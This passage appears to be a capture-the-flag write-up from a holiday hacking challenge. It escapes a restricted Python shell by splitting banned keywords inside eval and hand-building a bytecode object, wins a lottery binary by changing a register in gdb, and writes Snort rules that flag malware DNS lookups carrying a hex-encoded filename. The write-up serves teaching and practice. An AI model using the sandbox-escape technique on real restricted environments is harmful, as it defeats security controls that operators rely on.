<a class=header-link href=#python-escape-from-la><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>use the methods in the talk to generate bytecode</code>.</strong> See solution below.</p><p>We're inside a Python interpreter and need to run <code>./i_escaped</code>. The talk has the answer.</p><p>First, let's see what is banned out of the four keywords from the talk. Only <code>eval</code> is allowed.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>&gt;&gt;&gt;</span> os <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;os&#34;)&#39;</span>) 
</span></span><span style=display:flex><span><span style=color:#719e07>&gt;&gt;&gt;</span> os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;ls&#34;</span>)
</span></span><span style=display:flex><span>Use of the command os<span style=color:#719e07>.</span>system <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span>
</span></span></code></pre></div><ul><li><code>os.system</code> is banned.</li><li><code>subprocess</code> is also banned.</li><li><code>popen</code> is banned. seems like they are filtering <code>open</code> which catches <code>popen</code> too.</li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>&gt;&gt;&gt;</span> subprocess<span style=color:#719e07>.</span>popen
</span></span><span style=display:flex><span>Use of the command <span style=color:#b58900>open</span> <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span>
</span></span></code></pre></div><p>Let's find the Python version. <code>make_object</code> from the talk must be used in a similar version.</p><p>We are running in <code>3.5.2</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>&gt;&gt;&gt;</span> sys <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;sys&#34;)&#39;</span>) 
</span></span><span style=display:flex><span><span style=color:#719e07>&gt;&gt;&gt;</span> sys<span style=color:#719e07>.</span>version
</span></span><span style=display:flex><span><span style=color:#2aa198>&#39;3.5.2 (default, Nov 12 2018, 13:43:14) </span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>[GCC 5.4.0 20160609]&#39;</span>
</span></span></code></pre></div><p>I had a VM with <code>3.5.2</code> so I used this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>bypass</span>():
</span></span><span style=display:flex><span>    <span style=color:#719e07>import</span> os
</span></span><span style=display:flex><span>    <span style=color:#b58900>print</span>(os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;./i_escaped&#34;</span>))
</span></span></code></pre></div><p>To get:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>a</span>():
</span></span><span style=display:flex><span>   <span style=color:#719e07>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a<span style=color:#719e07>.</span>__code__ <span style=color:#719e07>=</span> <span style=color:#b58900>type</span>(a<span style=color:#719e07>.</span>__code__)(<span style=color:#2aa198>0</span>,<span style=color:#2aa198>0</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>3</span>,<span style=color:#2aa198>67</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;d</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>l</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>}</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>t</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>|</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>j</span><span style=color:#cb4b16>\x02\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x02\x00\x83\x01\x00\x83\x01\x00\x01</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>S&#39;</span>,(<span style=color:#cb4b16>None</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>&#39;./i_escaped&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>, <span style=color:#2aa198>&#39;print&#39;</span>, <span style=color:#2aa198>&#39;system&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>,),<span style=color:#2aa198>&#39;&lt;stdin&gt;&#39;</span>,<span style=color:#2aa198>&#39;bypass&#39;</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x00\x01\x0c\x01</span><span style=color:#2aa198>&#39;</span>)
</span></span></code></pre></div><p>And it works:</p><pre tabindex=0><code>Loading, please wait......
 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| &#39;_ \ / _ \| &#39;_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | &#39;_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             
That&#39;s some fancy Python hacking -
You have sent that lizard packing!
-SugarPlum Mary
            
You escaped! Congratulations!
0
</code></pre><hr><h1 id=9-ransomware-recovery>9. Ransomware Recovery
<a class=header-link href=#9-ransomware-recovery><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Challenge with multiple sections.</p><h2 id=the-sleighball>The Sleighball
<a class=header-link href=#the-sleighball><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>solution is below</code>.</strong></p><p>The article in the hints section, <a href=https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions target=_blank rel="noreferrer noopener">using gdb to call random functions</a> shows how to use GDB to directly jump to <code>winnerwinner</code>. I changed the drawing number because I think it's a better way.</p><p>We need to win the lottery:</p><pre tabindex=0><code>$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you&#39;ll draw...

You drew ticket number 4965!

Sorry - better luck next year!
</code></pre><p>The winning number seems to be <code>1225</code> all the time.</p><p>We can dump everything for offline analysis, but it's not needed:</p><ul><li><code>objdump -M intel -D sleighbell-lotto > dump1</code></li></ul><p><code>objdump</code> can dump the symbol table and shows different functions. One is <code>winnerwinner</code>. We can jump directly to it and win but I'd rather go to <code>main</code>.</p><pre tabindex=0><code>$ objdump --syms sleighbell-lotto 
sleighbell-lotto:     file format elf64-x86-64
SYMBOL TABLE:
// removed random symbols
0000000000000000       F *UND*  0000000000000000              printf@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              memset@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              puts@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000208060 g     O .data  0000000000000008              winnermsg
0000000000000fd7 g     F .text  00000000000004e0              winnerwinner
0000000000208070 g     O .bss   0000000000000008              decoded_data
0000000000000000       F *UND*  0000000000000000              srand@@GLIBC_2.2.5
00000000000014b7 g     F .text  0000000000000013              sorry
0000000000000000       F *UND*  0000000000000000              rand@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              time@@GLIBC_2.2.5
00000000000014ca g     F .text  00000000000000e1              main
</code></pre><p>Run it in GDB and <code>break main</code> and <code>set disassembly-flavor intel</code> (because AT&T syntax sucks).</p><p>Then <code>disass</code> on main to see where we are and see the check. I went through <code>main</code> and analyzed everything (side note: <code>analysis</code> was one of the banned words in the chat). See the analysis below but you can skip it:</p><p>Important part is here:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#586e75>; removed</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; drawn number is manipulated and stored here</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555553c</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>114</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#dc322f>DWORD</span> <span style=color:#268bd2>PTR</span> [<span style=color:#b58900>rbp</span><span style=color:#719e07>-</span><span style=color:#2aa198>0x4</span>],<span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; removed</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; later it&#39;s compared to 1225 or 0x04C9</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555582</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>184</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>cmp</span>    <span style=color:#dc322f>DWORD</span> <span style=color:#268bd2>PTR</span> [<span style=color:#b58900>rbp</span><span style=color:#719e07>-</span><span style=color:#2aa198>0x4</span>],<span style=color:#2aa198>0x4c9</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; if not equal, jump to sorry if not continue</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555589</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>191</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>jne</span>    <span style=color:#2aa198>0x555555555597</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>main</span><span style=color:#719e07>+</span><span style=color:#2aa198>205</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555558b</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>193</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#b58900>eax</span>,<span style=color:#2aa198>0x0</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; if equal, continuing execution reaches winnerwinner</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555590</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>198</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x555555554fd7</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>winnerwinner</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555595</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>203</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>jmp</span>    <span style=color:#2aa198>0x5555555555a1</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>main</span><span style=color:#719e07>+</span><span style=color:#2aa198>215</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555597</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>205</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#b58900>eax</span>,<span style=color:#2aa198>0x0</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; jump here if numbers are not equal</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555559c</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>210</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x5555555554b7</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>sorry</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00005555555555a1</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>215</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#b58900>edi</span>,<span style=color:#2aa198>0x0</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00005555555555a6</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>220</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x555555554920</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>exit@plt</span><span style=color:#719e07>&gt;</span>
</span></span></code></pre></div><p>There are multiple ways to do this:</p><ul><li>Set a breakpoint on <code>mov DWORD PTR [rbp-0x4],eax</code> and modify the value of <code>eax</code> to <code>0x04C9</code>.</li><li>Set a breakpoint on <code>jne 0x555555555597 &lt;main+205></code> and change the <code>ZF</code>.</li><li>And more.</li></ul><p>I did the first one:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#268bd2>break</span> <span style=color:#719e07>*</span><span style=color:#2aa198>0x000055555555554c</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>c</span> # <span style=color:#268bd2>continue</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>set</span> <span style=color:#cb4b16>$</span><span style=color:#b58900>rax</span> = <span style=color:#2aa198>0x4c9</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>c</span> # <span style=color:#268bd2>continue</span>
</span></span></code></pre></div><h3 id=more-analysis>More Analysis
<a class=header-link href=#more-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Something is pushed to <code>rdi</code> and then <code>getenv</code> is called. We can break on the <code>call getenv</code> line and read the contents of <code>rdi</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x00005555555554d9</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>15</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x555555554970</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>getenv@plt</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00005555555554de</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>20</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>test</span>   <span style=color:#b58900>rax</span>,<span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x00005555555554e1</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>23</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>jne</span>    <span style=color:#2aa198>0x5555555554f9</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>main</span><span style=color:#719e07>+</span><span style=color:#2aa198>47</span><span style=color:#719e07>&gt;</span>
</span></span></code></pre></div><p>Let's see what it does:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>(<span style=color:#268bd2>gdb</span>) <span style=color:#268bd2>x</span><span style=color:#719e07>/</span><span style=color:#268bd2>s</span> <span style=color:#cb4b16>$</span><span style=color:#b58900>rdi</span>
</span></span><span style=display:flex><span>0x55555555abaf: &#34;<span style=color:#268bd2>RESOURCE_ID</span>&#34;
</span></span></code></pre></div><p>So it's reading <code>RESOURCE_ID</code> from environmental variables and if it's not zero (see <code>test rax rax</code>) it jumps to <code>main+47</code>.</p><p><code>si</code> steps in and <code>ni</code> steps over for assembly instructions. In this case the result is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>(<span style=color:#268bd2>gdb</span>) <span style=color:#268bd2>x</span><span style=color:#719e07>/</span><span style=color:#268bd2>s</span> <span style=color:#cb4b16>$</span><span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>0x7fffffffe951: &#34;7<span style=color:#268bd2>a29a437</span><span style=color:#719e07>-</span><span style=color:#2aa198>8523</span><span style=color:#719e07>-</span><span style=color:#2aa198>4513</span><span style=color:#719e07>-</span><span style=color:#2aa198>828</span><span style=color:#268bd2>e</span><span style=color:#719e07>-</span><span style=color:#2aa198>53394</span><span style=color:#268bd2>fa647a4</span>&#34;
</span></span></code></pre></div><p>Might be a check to see if it's running in a docker container?</p><p>Next <code>edi</code> is set to zero and then <code>time</code> is called. Which gets the time.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x00005555555554fe</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>52</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x5555555549e0</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>time@plt</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555503</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>57</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>mov</span>    <span style=color:#b58900>edi</span>,<span style=color:#b58900>eax</span>
</span></span></code></pre></div><p>After the function call <code>rax</code> has the current time. View them with <code>info registers</code>:</p><ul><li><code>rax 0x5c28c70b 1546176267</code></li><li><code>edi</code> now has the time.</li></ul><p><code>srand(time)</code> calls <code>srand</code> and seeds it with the current time.</p><p>Before <code>puts</code> we can see <code>rdi</code> and see it always prints the following text.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555505</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>59</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x5555555549a0</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>srand@plt</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555550a</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>64</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>lea</span>    <span style=color:#b58900>rdi</span>,[<span style=color:#268bd2>rip</span><span style=color:#719e07>+</span><span style=color:#2aa198>0x583f</span>]        # <span style=color:#2aa198>0x55555555ad50</span>
</span></span></code></pre></div><p>Finally, the intro text is printed. Meaning the winning ticket is always the same. Maybe not, but the text is always the same.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555511</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>71</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x555555554910</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>puts@plt</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555516</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>76</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>mov</span>    <span style=color:#b58900>edi</span>,<span style=color:#2aa198>0x1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#268bd2>gdb</span>) <span style=color:#268bd2>x</span><span style=color:#719e07>/</span><span style=color:#268bd2>s</span> <span style=color:#cb4b16>$</span><span style=color:#b58900>rdi</span>
</span></span><span style=display:flex><span>0x55555555ad50: &#34;\<span style=color:#268bd2>nThe</span> <span style=color:#268bd2>winning</span> <span style=color:#268bd2>ticket</span> <span style=color:#268bd2>is</span> <span style=color:#268bd2>number</span> <span style=color:#2aa198>1225</span><span style=color:#268bd2>.</span>\<span style=color:#268bd2>nRolling</span> <span style=color:#268bd2>the</span> <span style=color:#268bd2>tumblers</span> <span style=color:#268bd2>to</span> <span style=color:#268bd2>see</span> <span style=color:#268bd2>what</span> <span style=color:#268bd2>nu</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>mber</span> <span style=color:#268bd2>you</span>&#39;<span style=color:#268bd2>ll</span> <span style=color:#268bd2>draw...</span>\<span style=color:#268bd2>n</span>&#34;
</span></span></code></pre></div><p>Then it sleeps for a second (see <code>sleep</code>).</p><p>Then calls <code>rand</code> and then does a bunch of stuff to it to generate our number:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555520</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>86</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>call</span>   <span style=color:#2aa198>0x5555555549c0</span> <span style=color:#719e07>&lt;</span><span style=color:#268bd2>rand@plt</span><span style=color:#719e07>&gt;</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555525</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>91</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>mov</span>    <span style=color:#b58900>ecx</span>,<span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555527</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>93</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>mov</span>    <span style=color:#b58900>edx</span>,<span style=color:#2aa198>0x68db8bad</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555552c</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>98</span><span style=color:#719e07>&gt;</span>:    <span style=color:#268bd2>mov</span>    <span style=color:#b58900>eax</span>,<span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555552e</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>100</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>imul</span>   <span style=color:#b58900>edx</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555530</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>102</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>sar</span>    <span style=color:#b58900>edx</span>,<span style=color:#2aa198>0xc</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555533</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>105</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#b58900>eax</span>,<span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555535</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>107</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>sar</span>    <span style=color:#b58900>eax</span>,<span style=color:#2aa198>0x1f</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x0000555555555538</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>110</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>sub</span>    <span style=color:#b58900>edx</span>,<span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555553a</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>112</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#b58900>eax</span>,<span style=color:#b58900>edx</span>
</span></span><span style=display:flex><span>0<span style=color:#268bd2>x000055555555553c</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>114</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#dc322f>DWORD</span> <span style=color:#268bd2>PTR</span> [<span style=color:#b58900>rbp</span><span style=color:#719e07>-</span><span style=color:#2aa198>0x4</span>],<span style=color:#b58900>eax</span>
</span></span></code></pre></div><p>Long story short, the result of calculation ends up in <code>eax</code> and stored in memory.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>0<span style=color:#268bd2>x000055555555554c</span> <span style=color:#719e07>&lt;+</span><span style=color:#2aa198>130</span><span style=color:#719e07>&gt;</span>:   <span style=color:#268bd2>mov</span>    <span style=color:#dc322f>DWORD</span> <span style=color:#268bd2>PTR</span> [<span style=color:#b58900>rbp</span><span style=color:#719e07>-</span><span style=color:#2aa198>0x4</span>],<span style=color:#b58900>eax</span>
</span></span></code></pre></div><p>Set a breakpoint here and change the value to <code>0x04C9</code> and we're done.</p><pre tabindex=0><code>(gdb) set $rax = 0x4c9
(gdb) c
Continuing.
You drew ticket number 1225!

// removed ASCII art

With gdb you fixed the race.
The other elves we did out-pace.
And now they&#39;ll see.
They&#39;ll all watch me.
I&#39;ll hang the bells on Santa&#39;s sleigh!
Congratulations! You&#39;ve won, and have successfully completed this challenge.
</code></pre><h2 id=91-catch-the-malware>9.1 Catch the Malware
<a class=header-link href=#91-catch-the-malware><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The answer contains two rules. For both outgoing and incoming DNS traffic with a specific string in them:</p><pre tabindex=0><code>alert udp any any -&gt; any 53 (msg:&#34;malware DNS request&#34;; sid:10000001; content:&#34;77616E6E61636F6F6B69652E6D696E2E707331&#34;;)
alert udp any 53 -&gt; any any (msg:&#34;malware DNS response&#34;;sid:10000002; content:&#34;77616E6E61636F6F6B69652E6D696E2E707331&#34;;)
</code></pre><ol><li>Login to the web interface at <a href=http://snortsensor1.kringlecastle.com/ target=_blank rel="noreferrer noopener">http://snortsensor1.kringlecastle.com/</a> and download some pcaps.</li><li>Look inside them and see the DNS requests.<pre tabindex=0><code> 77616E6E61636F6F6B69652E6D696E2E707331.rahbegunsr.net
 77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com
 12.77616E6E61636F6F6B69652E6D696E2E707331.rahbegunsr.net
 16.77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com
 1.77616E6E61636F6F6B69652E6D696E2E707331.hngaerrbus.org
